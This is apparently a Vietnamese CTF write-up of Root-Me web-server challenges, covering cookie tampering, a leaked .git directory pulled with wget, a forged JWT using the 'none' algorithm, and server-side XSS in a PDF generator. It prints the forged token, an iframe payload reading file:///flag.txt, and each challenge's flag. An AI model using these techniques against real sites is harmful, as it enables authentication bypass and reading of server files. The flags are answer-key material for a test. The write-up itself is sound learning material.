Thay jwt này vào request và gửi:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image154.png?raw=true)

**Password: Fl4sK_mi5c0nfigur4ti0n**

### HTTP - Cookies

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image155.png?raw=true)

Start the challenge:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image156.png?raw=true)

Xem source page:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image157.png?raw=true)

Tìm được path `"?c=visiteur`, thử truy cập:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image158.png?raw=true)

-> "You need to be admin". 

Kiểm tra cookie thì thấy 1 cookie có tên `ch7` đang có giá trị `visiteur`, thử thay thành `admin` và reload:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image160.png?raw=true)

**Password: ml-SYMPA**

### Insecure Code Management

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image161.png?raw=true)

Start the challenge: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image162.png?raw=true)

Xem source page:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image163.png?raw=true)

Thử đăng nhập với `username:admin` và `password:admin`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image164.png?raw=true)

Kiểm tra request:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image165.png?raw=true)

Tìm được session có giá trị `eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.Z-xybg.BHYr8gtgg5SNHzb-smjqMfVIxM0`. Giải mã jwt này:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image166.png?raw=true)

Ý tưởng là có thể thay thế phần header thành dạng như sau:

    {
    "admin": "true",
    "username": "admin"
    }
{"admin": "true", "username": "admin"}
Nhưng hiện tại chưa có chữ ký, trong jwt gốc có vẻ chữ ký không phải là 1 giá trị hợp lệ. 

Thử dùng `flask-unsign` tìm chữ ký hợp lệ:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image167.png?raw=true)

--> Chữ ký `s3cr3t`. Sử dụng chữ ký này để sinh jwt mới. Không được

Thử `dirsearch` tìm xem có endpoint ẩn nào không:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image168.png?raw=true)

Website để lộ `.git`. Việc để lộ `.git` là rất nguy hiểm. Thử truy cập `.git`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image169.png?raw=true)

Tải toàn bộ thư mục `.git` về sử dụng `wget`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image170.png?raw=true)

Chỉ lấy được file `index.html`. Dùng lệnh khác để download:

    wget -r -np -R "index.html*" http://challenge01.root-me.org/web-serveur/ch61/.git/

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image171.png?raw=true)

Tải được thư mục của challenge. Truy cập thư mục `.git`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image172.png?raw=true)

Khi sử dụng `dirsearch`, tìm được file `config.php` nhưng khi truy cập lại không hiển thị nội dung gì:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image173.png?raw=true)

Có thể file đã bị xóa và đang commit ở một nhánh nào đó. Sử dụng `git checkout .` để khôi phục lại:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image174.png?raw=true)

Tìm được nội dung của file `config.php`, chứa mật khẩu của admin nhưng đã được băm. Dựa vào nội dung file `COMMIT_EDITMSG`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image175.png?raw=true)

Có thể password được băm với thuật toán SHA-256. Thử decode:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image176.png?raw=true)

**Password: s3cureP@ssw0rd**

### JWT - Introduction

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image177.png?raw=true)

Start the challenge:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image178.png?raw=true)

Xem source page:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image179.png?raw=true)

Thử truy cập `/index.php?guest`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image180.png?raw=true)

Inspect trang này:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image181.png?raw=true)

Tìm được cookie có tên `jwt` có giá trị là `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk`. Thử decode jwt:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image182.png?raw=true)

Có thể thử thay thế payload thành: 

    {
        username: "admin"
    }

Sử dụng `flask-unsign` để tìm ra chữ ký nhưng không tìm được vì chữ ký trong jwt gốc có vẻ là 1 chữ ký hợp lệ.

Có thể thử thay đổi jwt header, chuyển `algorithm` thành `none` để vô hiệu hóa chữ ký:

Giải mã và mã hóa lại từng thành phần trong jwt (không cần làm với key vì `algorithm` được set về `none`):

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image183.png?raw=true)

-> JWT Token mới: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.`

Thay vào website:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image184.png?raw=true)

**Password: S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7**

### XSS - Server Side

![img](185)

Start the challenge:

![img](186)

Thử nhập 1 payload đơn giản vào và thử click `Generate`:

![img](187)

-> 1 file pdf được tự động tải xuống, nội dung của file như sau:

![img](188)

-> Chức năng của website có thể là tạo file pdf tự động, chuyển văn bản nhập vào thành file pdf.

Thử click `Sign up` và đăng ký 1 tài khoản có `username:user1` và `password:user1`:

![img](189)

`Log in` vào tài khoản này:

![img](191)

Thử nhập lại payload ban đầu và xem file pdf xuất ra có gì khác không:

![img](192)

Xuất hiện `first name` và `last name` đã nhập khi `sign up`. Thử khai thác ô nhập `first name` và `last name` này. 

`Log out` và `sign up` 1 tài khoản mới, lần này thử chèn 1 thẻ `<img/>` vào trường `first name`:

![img](193)

`Generate` file pdf mới và xem kết quả:

![img](194)

-> Có thể chèn hình ảnh từ website khác vào pdf. 

Theo mô tả thử thách, cần xem được nội dung file `/flag.txt`. Thử xem nội dung file trực tiếp từ website xem có thể truy cập không:

![img](195)

Thử tạo một người dùng mới với `first name` là:

    <iframe src=file:///flag.txt></iframe>

Sử dụng `<iframe>` để nhúng nội dung từ trang web khác, `src=file:///flag.txt` sẽ nhúng file `flag.txt` từ server cục bộ. Dùng đúng cú pháp `file:///` để đảm bảo server hiểu chính xác muốn truy cập file hệ thống, đây là cú pháp chuẩn theo `RFC 8089` cho truy cập file local.

![img](196)

Generate file pdf mới:

![img](197)

**Password: s3rv3r_s1d3_xss_1s_w4y_m0r3_fun**




























































































